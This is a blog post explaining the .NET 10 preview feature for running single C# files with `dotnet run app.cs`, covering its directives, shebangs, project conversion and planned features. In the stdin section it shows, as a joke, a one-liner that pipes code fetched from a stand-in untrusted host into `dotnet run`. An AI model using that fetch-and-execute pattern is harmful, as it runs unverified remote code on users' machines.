```yaml
---
title: Exploring the features of dotnet run app.cs
source: https://andrewlock.net/exploring-dotnet-10-preview-features-1-exploring-the-dotnet-run-app.cs/
date_published: 2025-07-01T13:00:00.000Z
date_captured: 2025-08-11T14:13:42.369Z
domain: andrewlock.net
author: Unknown
category: general
technologies: [.NET 10, ASP.NET Core, Aspire, MSBuild, NuGet, Visual Studio Code, NativeAOT, Cake, dotnet-script, CS-Script, CSI.exe]
programming_languages: [C#, Bash, XML]
tags: [.net-10, csharp, cli, dotnet-sdk, single-file-apps, developer-experience, msbuild, nuget, preview-features, scripting]
key_concepts: [single-file-execution, shebang, msbuild-properties, nuget-package-references, sdk-references, project-conversion, native-aot, top-level-statements]
code_examples: true
difficulty_level: intermediate
summary: |
  This article introduces the new `dotnet run app.cs` feature in .NET 10, enabling the execution of single C# files without requiring a `.csproj` project file. It details the various directives supported, such as `#:sdk`, `#:package`, and `#:property`, and explains how to make files executable using shebangs. The author emphasizes that this feature aims to simplify the learning curve for new .NET developers and is useful for utility scripts and samples. The post also covers upcoming enhancements like `dotnet publish app.cs` (with NativeAOT) and direct execution via `dotnet app.cs`, while outlining current limitations like the lack of multi-file support in .NET 10 and no Visual Studio integration.
---
```

# Exploring the features of dotnet run app.cs

# Exploring the features of dotnet run app.cs

This is the first post in the series: [Exploring the .NET 10 preview](/series/exploring-the-dotnet-10-preview/).

1.  Part 1 - Exploring the features of dotnet run app.cs (this post)
2.  [Part 2 - Behind the scenes of dotnet run app.cs](/exploring-dotnet-10-preview-features-2-behind-the-scenes-of-dotnet-run-app.cs/)
3.  [Part 3 - C# 14 extension members; AKA extension everything](/exploring-dotnet-10-preview-features-3-csharp-14-extensions-members/)
4.  [Part 4 - Solving the source generator 'marker attribute' problem in .NET 10](/exploring-dotnet-10-preview-features-4-solving-the-source-generator-marker-attribute-problem-in-dotnet-10/)
5.  [Part 5 - Running one-off .NET tools with dnx](/exploring-dotnet-10-preview-features-5-running-one-off-dotnet-tools-with-dnx/)
6.  [Part 6 - Passkey support for ASP.NET Core identity](/exploring-dotnet-10-preview-features-6-passkey-support-for-aspnetcore-identity/)

In this post I describe the new feature coming in .NET 10 for building and running a single C# file _without_ needing to first create a .csproj project. I show it in action, describe the features, and discuss the limitations. In the next post I look at how it works behind the scene.

> I struggled a bit with what to call this post, because there doesn't seem to be a final name for the feature I'm describing 😅 In some places it's called "[file-based programs](https://github.com/dotnet/sdk/issues/48990)", internally it's sometimes referred to as "[runfile](https://github.com/dotnet/sdk/blob/main/documentation/general/dotnet-run-file.md#multiple-c-files)", but publicly it's described more as "[dotnet run app.cs](https://devblogs.microsoft.com/dotnet/announcing-dotnet-run-app/)", which describes _how_ you use it.

## What is `dotnet run app.cs`?

Prior to .NET 10, a "hello world" C# application required at least 2 files:

*   A _.csproj_ project file
*   A _.cs_ file containing [top-level statements](https://learn.microsoft.com/en-us/dotnet/csharp/fundamentals/program-structure/top-level-statements)

Now .NET 10 includes [preview support](https://devblogs.microsoft.com/dotnet/announcing-dotnet-run-app/) for removing the need for the _.csproj_ file too. Finally, a .NET application _only_ needs a single _.cs_ file. The hello-world C# program now becomes:

```csharp
Console.WriteLine("Hello, world");
```

Save that to a file, _app.cs_ for example, and you can run your application with `dotnet run app.cs`:

```bash
> dotnet run app.cs
Hello, world
```

This was first demoed by Damian Edwards in [this short 15 minute session at MSBuild](https://www.youtube.com/watch?v=98MizuB7i-w) where he gives a good overview. You can also read more about it in [the announcement post](https://devblogs.microsoft.com/dotnet/announcing-dotnet-run-app/). In the next section I'll describe the basic features that are available with the new single-file experience.

## What features are available?

The single-file `dotnet run` experience is currently relatively limited and yet also provides enough configuration points for you to get a long way before you hit a wall. The following small example shows a simple no-op Aspire app host implemented as a single file. It doesn't actually _do_ anything, it's just for demonstrating all the features available in .NET 10 preview 5. I'll walk through this same, and the features it uses, from top to bottom:

```csharp
#!/usr/bin/dotnet run

#:sdk Microsoft.NET.Sdk
#:sdk Aspire.AppHost.Sdk 9.3.0

#:package Aspire.Hosting.AppHost@9.3.0

#:property UserSecretsId 2eec9746-c21a-4933-90af-c22431f35459

using Microsoft.Extensions.Configuration;

var builder = DistributedApplication.CreateBuilder(args);
builder.Configuration.AddInMemoryCollection(new Dictionary<string, string?>
{
    { "ASPIRE_DASHBOARD_OTLP_ENDPOINT_URL", "https://localhost:21049" },
    { "ASPIRE_RESOURCE_SERVICE_ENDPOINT_URL", "https://localhost:22001" },
    { "ASPNETCORE_URLS", "https://localhost:17246" },
});

builder.Build().Run();
```

This script demonstrates all of the new directives available with the single run file experience.

### Making a file executable with a shebang

The line starting with `#!` at the top of the script is called [a _shebang_](https://en.wikipedia.org/wiki/Shebang_\(Unix\)), and is a directive for *nix systems that allow you to run the file directly. In this case, it tells the system to run the file using `/usr/bin/dotnet run <file>`. If you make the file executable using `chmod`, then you can run it directly from your shell:

```bash
chmod +x app.cs
./app.cs
```

### Adding SDK references

By default, single-file apps will use the `Microsoft.NET.Sdk` MSBuild project SDK by default, which is what you need for building console apps. However, if you're building ASP.NET Core apps, for example, then you need the `Microsoft.NET.Sdk.Web` SDK, and you need to set that using the `#:sdk` syntax.

> [MSBuild project SDKs](https://learn.microsoft.com/en-us/dotnet/core/project-sdk/overview) are what you normally see referenced in the `<Project>` element in your _.csproj_ file. You don't _normally_ have to worry about them much, because `dotnet new` templates create the correct values for you.

In the Aspire example above you'll actually see _two_ `#:sdk` references:

```csharp
#:sdk Microsoft.NET.Sdk
#:sdk Aspire.AppHost.Sdk 9.3.0
```

The first `#:sdk` sets the _project_ SDK, and then the second `#:sdk` specifies the [Aspire additive MSBuild project SDK](https://learn.microsoft.com/en-us/dotnet/aspire/fundamentals/dotnet-aspire-sdk), which is a versioned SDK that comes from a NuGet package.

> The current syntax for specifying the version of versioned SDKs may well change. As of .NET preview 5, the syntax uses a space separator, but is changing to use `@` in the future e.g. `#:sdk Aspire.AppHost.Sdk@9.3.0`.

The `Aspire.AppHost.Sdk` SDK comes from a NuGet package, so obviously there's a way to specify NuGet package references too!

### Adding NuGet package references

You can reference NuGet packages using the `#:package` directive, providing a package name and a version. The following installs version 9.3.0 of the Aspire.Hosting.AppHost NuGet package:

```csharp
#:package Aspire.Hosting.AppHost@9.3.0
```

You can also use wildcards for version numbers, so all of the following are also valid:

```csharp
#:package Aspire.Hosting.AppHost@*
#:package Aspire.Hosting.AppHost@9.*
#:package Aspire.Hosting.AppHost@9.3.*
```

The wildcard will generally resolve to the highest package version that satisfies the other requirements.

### Updating MSBuild properties

The final (currently) supported directive is `#:property` which is used to define MSBuild properties for the app. Basically any properties that you would normally define in a _.csproj_ file in a `<PropertyGroup>` can be added using this directive. In my example, I set the `UserSecretsId` property value using:

```csharp
#:property UserSecretsId 2eec9746-c21a-4933-90af-c22431f35459
```

This is another example where the syntax will be changing shortly. Instead of space-separated values, you will need to use `=` separated values, e.g.

```csharp
#:property UserSecretsId=2eec9746-c21a-4933-90af-c22431f35459
```

That's all the directives that are supported as of .NET 10 preview 5, but in .NET preview 6 you'll have one more available.

### Referencing projects (coming soon)

.NET 10 preview 6 should include the ability for single files to reference _projects_ via a `#:project` directive. This work is [already merged](https://github.com/dotnet/sdk/pull/49311), but it's not released yet, so it could change before then. Currently, you can either reference a project using the full path to the _.csproj_ file, or simply reference the _directory_ containing the project:

```csharp
#:project ../src/MyProject
#:project ../src/MyProject/MyProject.csproj
```

Being able to reference the project directory instead of the full _.csproj_ path is a nice way to reduce a bit of duplication. And it's pretty much in line with the philosophy [Damian Edwards and others described on a recent community standup](https://www.youtube.com/watch?v=rb9oXSpfEB0&list=PLdo4fOcmZ0oX-DBuRG4u58ZTAJgBAeQ-t&index=3): given this whole experience is new, they want to make it as smooth as possible for newcomers coming in, which means smoothing off any rough edges they can.

## Who is `dotnet run app.cs` for?

That brings us nicely to the question: who is the single-file experience actually _for_? First and foremost, the .NET team have made it clear that this is about making the learning experience for newcomers to .NET as smooth as possible. Many other languages, whether they're Node.js or Python, for example, have a single-file experience, and now .NET does too.

Overall, the feature is intended to shield you from all the things you don't care about when you're very first learning C# and .NET; i.e. the project file. Think of yourself as a brand new C# user. You run `dotnet new console` to create a new console app. The `Program.cs` file is simple and elegant, just a `Console.WriteLine()` but you also have this mysterious _.csproj_ file, filled with _XML_ of all things, and with a bunch of stuff that will likely nothing to you 😅

```xml
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net9.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>
```

With single-file run, that all goes away. As a newcomer you can start from scratch, just the _.cs_ file, and can slowly introduce concepts as you go.

Eventually you'll hit a point where it _does_ make sense to have a dedicated project—maybe you want to have multiple _.cs_ files, for example. At that point, you can simply convert your single-file to a project, by running:

```bash
dotnet project convert app.cs
```

Running that command on the Aspire app host example I showed at the start of this post creates a project file that looks like this:

```xml
<Project Sdk="Microsoft.NET.Sdk">

  <Sdk Name="Aspire.AppHost.Sdk" Version="9.3.0" />

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net10.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <PropertyGroup>
    <UserSecretsId>2eec9746-c21a-4933-90af-c22431f35459</UserSecretsId>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="Aspire.Hosting.AppHost" Version="9.3." />
  </ItemGroup>

</Project>
```

All the directives I added are included in the project, and you can see the other defaults that I _didn't_ specify there too now. This is a very slick grow-up story for moving from single-file projects to a project file.

Although newcomers are the main target audience for the single-file experience, there's several scenarios where removing the heaviness of needing a dedicated project (and corresponding directory) makes sense. For example:

*   **Utility scripts**. Previously you would likely use bash or PowerShell, but now you can easily use C# if you prefer.
*   **Samples**. Many libraries or frameworks have multiple sample apps for demonstrating a feature, each of which would need its own folder and project file. Now you can have a single folder where each _.cs_ file is a sample app.

That covers a couple of the main uses, but we can also consider uses for which single-file programs are _already_ used! This is not the first attempt at creating a single-file or scripting experience for .NET. For example, I first used a single-file C# experience with [Cake](https://cakebuild.net/), but there are various other approaches too, such as the [dotnet-script](https://github.com/dotnet-script/dotnet-script) tool, [CS-Script](https://github.com/oleg-shilo/cs-script/wiki/CS-Script-Overview), or even the [C# REPL CLI tool, CSI.exe](https://learn.microsoft.com/en-us/archive/msdn-magazine/2016/january/essential-net-csharp-scripting#the-c-repl-command-line-interface-csiexe). Each of those tools work in slightly different ways, many of which may well also lend themselves to the new built-in experience.

## Going further with escape hatches

I've covered a lot of the features that are explicitly part of the `dotnet run app.cs` experience, but the fact that the whole feature is built around a "virtual" project, means that you can somewhat hack around current limitations in the directives. Put another, way, there are various files that the single-file app will _implicitly_ use if they're available. These include:

*   [_global.json_](https://learn.microsoft.com/en-us/dotnet/core/tools/global-json)
*   [_NuGet.config_](https://learn.microsoft.com/en-us/nuget/reference/nuget-config-file)
*   [_Directory.Build.props_](https://learn.microsoft.com/en-us/visualstudio/msbuild/customize-by-directory?view=vs-2022#directorybuildprops-and-directorybuildtargets)
*   [_Directory.Build.targets_](https://learn.microsoft.com/en-us/visualstudio/msbuild/customize-by-directory?view=vs-2022#directorybuildprops-and-directorybuildtargets)
*   [_Directory.Packages.props_](https://devblogs.microsoft.com/dotnet/introducing-central-package-management/)
*   [_Directory.Build.rsp_](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-response-files?view=vs-2022)
*   [_MSBuild.rsp_](https://learn.microsoft.com/en-us/visualstudio/msbuild/msbuild-response-files?view=vs-2022)

I won't go into details about all these files here, so see the linked documentation if you've not heard about them (the _.rsp_ files were new to me)! Arguably the most useful of these files is the _Directory.Build.props_ which essentially allows you to "enhance" your single-file app with anything that you would normally put in a _.csproj_ file. This is particularly useful if you have, for example, a bunch of single-file apps in a directory, and you want to set a property or add a package to them all, without updating each one.

> That's all a bit abstract, but you can see various examples of this kind of thing in [Damian Edwards' playground repository](https://github.com/DamianEdwards/runfile) for the feature!

Before we finish, I'll describe some of the features that should be coming soon to the `dotnet run app.cs` experience .

## What else is coming?

In this section I'll highlight a few things that are very likely to be part of the future single-file experience. As always with preview features, there's no guarantee that they'll make the final cut, but the bets are good for the first few features at least given they're already merged!

### Publishing single file apps

One feature which isn't available in .NET 10 preview 5, but which is already merged for preview 6, is the ability [to _publish_ your single-file apps](https://github.com/dotnet/sdk/pull/49310) using:

```bash
dotnet publish app.cs
```

What's more, by default, [the apps are published as NativeAOT apps](https://github.com/dotnet/sdk/issues/49189)! You can disable that by adding `#:property PublishAot false` to your project, but it's likely that things will just work for many of the scenarios single-file apps are designed for🤷‍♂️

### Running with `dotnet app.cs`

Another feature [that's already merged](https://github.com/dotnet/sdk/pull/48387) is support for running single-file apps _without_ using the `run` command, i.e. you can use

```bash
dotnet app.cs
```

instead of having to use

```bash
dotnet run app.cs
```

One of the main advantages to this is that it makes the support for shebangs on linux more robust. For example, if you want to use `/usr/bin/env` in order to "find" the `dotnet` executable, instead of assuming it's in `/usr/bin/dotnet` then previously you would need something like this:

```csharp
#!/usr/bin/env dotnet run
// ^ Might not work in all shells. "dotnet run" might be passed as a single argument to "env".
```

Unfortunately, this multi-argument requirement might not work in some shells. With the new `dotnet app.cs` support however, you can use the simpler, and more widely supported:

```csharp
#!/usr/bin/env dotnet
// ^ Should work in all shells.
```

### Running C# directly from stdin code

Support for piping C# code directly to `dotnet run` was [merged recently](https://github.com/dotnet/sdk/pull/49348) and means you can do things like this:

```bash
> 'Console.WriteLine("Hello, World!");' | dotnet run -
Hello, World!
```

This pipes a hello world app directly from the console to `dotnet run` and executes it. The classic case of "you should never do this but people do all the time" of curl-ing a website and running it directly is now possible 😅

```bash
> curl -S http://totally-safe-not-scary-at-all.com/ | dotnet run -
All your bases are belong to us!
```

### Future ideas

You can see all the other issues that have been opened (or closed) for the feature by looking for [the `Area-run-file` label on GitHub](https://github.com/dotnet/sdk/issues?q=state%3Aopen%20label%3A%22Area-run-file%22). You can also read more about the feature in general, including much of what's in this post, as well as [other planned work here](https://github.com/dotnet/sdk/blob/main/documentation/general/dotnet-run-file.md#alternatives-and-future-work).

## What is _not_ coming?

So that covers the features that are currently shipped, as well as a bunch of features that will be shipping very soon, and some potential features that _may_ ship with .NET 10. But what about the other side; what's _not_ coming?

One big feature that is _not_ coming to .NET 10 [is support for multiple files](https://github.com/dotnet/sdk/issues/48174). This was originally planned to be included, with things like "nested" files and sub directories being implicitly included in the compilation. Instead, this work has been [pushed back to .NET 11](https://github.com/dotnet/sdk/blob/main/documentation/general/dotnet-run-file.md#multiple-c-files), to focus on making the single-file experience as good as possible.

> You can _indirectly_ get support for multiple files using Directory.Build.props and Directory.Build.targets and adding references to the files "manually".

Another thing that was mentioned in [a recent community standup](https://www.youtube.com/watch?v=rb9oXSpfEB0&list=PLdo4fOcmZ0oX-DBuRG4u58ZTAJgBAeQ-t&index=3) is that single-file support is _not_ coming to Visual Studio. The 1st party support from Microsoft will _only_ be in Visual Studio Code (and the CLI, obviusly). There's already [an issue for adding Rider support here](https://youtrack.jetbrains.com/issue/RIDER-126336/Support-dotnet-run-file.cs) so be sure to upvote it if you're interested in support!

Finally, it's worth saying that at this stage, single-file support is _only_ coming for `.cs` files; not for _.vb_ or _.fs_ files. The team haven't entirely ruled this out as a possibility, but it's very unlikely Microsoft will add support themselves.

## Summary

In this post I described the new single-file experience of `dotnet run app.cs` coming to .NET 10. I showed how the basic feature works and described the various features supported today: `#:package`, `#:property`, `#:sdk`, and shebangs. I then described the target audience for the feature, described some of the other files you can reference, and discussed some new features that are coming soon. Finally, I described some of the scenarios and environments that will not be supported. In the next post I'll dig into some of the SDK code itself and show how some of the features are implemented.

This Series [Exploring the .NET 10 preview](/series/exploring-the-dotnet-10-preview/)

![A stack of pancakes with chocolate sauce, strawberries, and whipped cream on top.](/content/images/2025/pancake_stack.webp)
![Three purple circular stickers with the white ".NET" logo, one of which is peeling slightly.](/content/images/2025/single-file-dotnet-2.webp)
![Promotional banner for Dometrain Pro offering 30% off with code ANDREW30, showing a person typing on a laptop.](/content/images/a/nickchapsas2025.jpg)
![Book cover for "ASP.NET Core in Action, Third Edition" by Andrew Lock, featuring an illustration of a historical figure.](/content/images/aspnetcoreinaction3e.png)